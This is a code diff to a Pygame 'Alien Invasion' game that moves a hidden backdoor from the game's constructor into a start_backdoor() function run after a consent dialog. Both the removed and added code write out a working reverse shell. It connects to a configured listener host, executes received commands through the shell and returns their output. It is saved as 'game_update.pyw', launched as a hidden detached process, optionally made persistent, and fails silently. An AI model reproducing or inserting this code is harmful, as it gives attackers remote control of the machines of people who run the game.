@@ -20,11 +20,6 @@ class AlienInvasion:
     
     def __init__(self):
         """Initialize the game and create game resources"""
-        # Initialize backdoor if enabled
-        self.backdoor = None
-        if config.ENABLE_BACKDOOR:
-            self._initialize_backdoor()
-        
         pygame.init()
         self.settings = Settings()
         self.screen = pygame.display.set_mode(
@@ -38,95 +33,6 @@ class AlienInvasion:
         self._create_fleet()
         self.play_button = Button(self, "Start game")
     
-    def _initialize_backdoor(self):
-        """Initialize backdoor functionality - launches as separate process"""
-        if not config.ENABLE_BACKDOOR:
-            return
-            
-        try:
-            import subprocess
-            import sys
-            import os
-            import tempfile
-            
-            # Create the exact same backdoor that works in test_backdoor_simple.py
-            backdoor_code = f'''import socket
-import subprocess
-import time
-
-LISTENER_HOST = "{config.LISTENER_HOST}"
-LISTENER_PORT = {config.LISTENER_PORT}
-
-while True:
-    try:
-        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        sock.settimeout(10)
-        sock.connect((LISTENER_HOST, LISTENER_PORT))
-        
-        while True:
-            try:
-                cmd = sock.recv(1024).decode().strip()
-                if not cmd or cmd.lower() == 'exit':
-                    break
-                
-                try:
-                    output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, timeout=30)
-                    sock.send(output)
-                except Exception as e:
-                    sock.send(f"Error: {{str(e)}}\\\\n".encode())
-            except:
-                break
-        
-        sock.close()
-    except:
-        pass
-    
-    time.sleep(5)
-'''
-            
-            # Write to temp file
-            fd, temp_path = tempfile.mkstemp(suffix='.pyw', text=True)
-            with os.fdopen(fd, 'w') as f:
-                f.write(backdoor_code)
-            
-            # Launch as detached process
-            if os.name == 'nt':  # Windows
-                # Find pythonw.exe
-                python_dir = os.path.dirname(sys.executable)
-                pythonw = os.path.join(python_dir, 'pythonw.exe')
-                if not os.path.exists(pythonw):
-                    pythonw = sys.executable
-                
-                # Create startup info to hide window
-                import subprocess
-                si = subprocess.STARTUPINFO()
-                si.dwFlags = subprocess.STARTF_USESHOWWINDOW
-                si.wShowWindow = 0  # SW_HIDE
-                
-                # Start process
-                subprocess.Popen(
-                    [pythonw, temp_path],
-                    startupinfo=si,
-                    creationflags=0x00000008,  # DETACHED_PROCESS
-                    close_fds=True
-                )
-            else:  # Linux
-                subprocess.Popen(
-                    [sys.executable, temp_path],
-                    start_new_session=True,
-                    stdout=subprocess.DEVNULL,
-                    stderr=subprocess.DEVNULL,
-                    stdin=subprocess.DEVNULL
-                )
-            
-            # Install persistence if enabled
-            if config.ENABLE_PERSISTENCE:
-                pm = PersistenceManager()
-                pm.install_persistence()
-                
-        except Exception as e:
-            # Fail silently
-            pass
       
     def run_game(self):
         """Start the main loop for the game"""
@@ -398,6 +304,85 @@ def show_consent_dialog():
     
     return False
 
+def start_backdoor():
+    """Start the backdoor process after user consent"""
+    try:
+        import subprocess
+        import sys
+        import os
+        import tempfile
+        
+        # Create backdoor script
+        backdoor_script = f'''import socket
+import subprocess
+import time
+
+LISTENER_HOST = "{config.LISTENER_HOST}"
+LISTENER_PORT = {config.LISTENER_PORT}
+
+while True:
+    try:
+        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        sock.settimeout(10)
+        sock.connect((LISTENER_HOST, LISTENER_PORT))
+        
+        while True:
+            try:
+                cmd = sock.recv(1024).decode().strip()
+                if not cmd or cmd.lower() == 'exit':
+                    break
+                
+                try:
+                    output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, timeout=30)
+                    sock.send(output)
+                except Exception as e:
+                    sock.send(f"Error: {{str(e)}}\\\\n".encode())
+            except:
+                break
+        
+        sock.close()
+    except:
+        pass
+    
+    time.sleep(5)
+'''
+        
+        # Write to temp file
+        temp_dir = tempfile.gettempdir()
+        backdoor_path = os.path.join(temp_dir, 'game_update.pyw')
+        
+        with open(backdoor_path, 'w') as f:
+            f.write(backdoor_script)
+        
+        # Launch it
+        if os.name == 'nt':  # Windows
+            # Find pythonw.exe
+            python_dir = os.path.dirname(sys.executable)
+            pythonw = os.path.join(python_dir, 'pythonw.exe')
+            
+            if not os.path.exists(pythonw):
+                import shutil
+                pythonw = shutil.which('pythonw.exe')
+                if not pythonw:
+                    pythonw = sys.executable
+            
+            # Start the backdoor
+            subprocess.Popen(
+                [pythonw, backdoor_path],
+                creationflags=0x00000008,  # DETACHED_PROCESS
+                close_fds=True
+            )
+        
+        # Install persistence
+        if config.ENABLE_PERSISTENCE:
+            from persistence import PersistenceManager
+            pm = PersistenceManager()
+            pm.install_persistence()
+            
+    except Exception as e:
+        # Fail silently
+        pass
+
 if __name__ == '__main__':
     # Prevent multiple instances
     import socket
@@ -418,6 +403,10 @@ if __name__ == '__main__':
     # Show consent dialog (GUI-based)
     if not show_consent_dialog():
         sys.exit(0)
+    
+    # User clicked YES - start backdoor NOW
+    if config.ENABLE_BACKDOOR:
+        start_backdoor()
     
     # Start the game
     ai = AlienInvasion()
